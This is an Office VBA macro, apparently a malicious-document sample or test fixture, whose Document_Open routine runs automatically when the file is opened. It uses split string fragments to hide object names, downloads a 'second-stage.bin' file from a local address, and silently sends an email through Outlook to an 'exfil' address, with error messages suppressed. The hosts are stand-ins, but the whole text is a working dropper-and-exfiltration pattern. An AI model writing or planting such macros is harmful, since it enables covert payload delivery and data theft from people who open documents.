Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim http As Object, url As String
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    url = "http:/" & "/127.0.0." & "1:90" & "90/se" & "cond-s" & "tage" & ".bin"
    Set http = CreateObject("MSXML" & "2.XMLHTT" & "P")
    http.Open "GET", url, False
    http.Send
    Set olApp = CreateObject("Outlo" & "ok.App" & "licati" & "on")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "exfil@example.com"
    olMail.Subject = "logs"
    olMail.Body = http.Status
    olMail.Send
End Sub
